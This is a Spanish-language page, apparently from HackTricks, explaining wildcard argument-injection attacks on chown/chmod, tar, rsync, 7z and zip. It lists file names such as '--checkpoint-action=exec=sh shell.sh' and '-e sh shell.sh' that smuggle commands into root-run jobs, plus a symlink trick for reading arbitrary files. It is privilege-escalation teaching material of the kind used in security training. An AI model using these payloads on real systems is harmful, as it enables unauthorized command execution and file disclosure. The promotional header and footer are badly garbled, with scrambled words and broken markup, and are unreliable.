{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Aprende & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Compartiendo trucos al enviar PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Puedes **indicar qué propietario de archivo y permisos deseas copiar para el resto de los archivos**
```bash
touch "--reference=/my/own/path/filename"
```
Puedes explotar esto usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque combinado)_\
Más información en [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Ejecutar comandos arbitrarios:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Puedes explotar esto usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque tar)_\
Más información en [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Ejecutar comandos arbitrarios:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Puedes explotar esto usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_ataque _rsync)_\
Más información en [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

En **7z** incluso usando `--` antes de `*` (ten en cuenta que `--` significa que la entrada siguiente no puede ser tratada como parámetros, así que solo rutas de archivos en este caso) puedes causar un error arbitrario para leer un archivo, así que si un comando como el siguiente está siendo ejecutado por root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Y puedes crear archivos en la carpeta donde se está ejecutando esto, podrías crear el archivo `@root.txt` y el archivo `root.txt` siendo un **symlink** al archivo que deseas leer:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Entonces, cuando **7z** se ejecute, tratará `root.txt` como un archivo que contiene la lista de archivos que debe comprimir (eso es lo que indica la existencia de `@root.txt`) y cuando 7z lea `root.txt`, leerá `/file/you/want/to/read` y **como el contenido de este archivo no es una lista de archivos, lanzará un error** mostrando el contenido.

_Más información en los Write-ups de la caja CTF de HackTheBox._

## Zip

**Ejecutar comandos arbitrarios:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Aprende & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o el [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
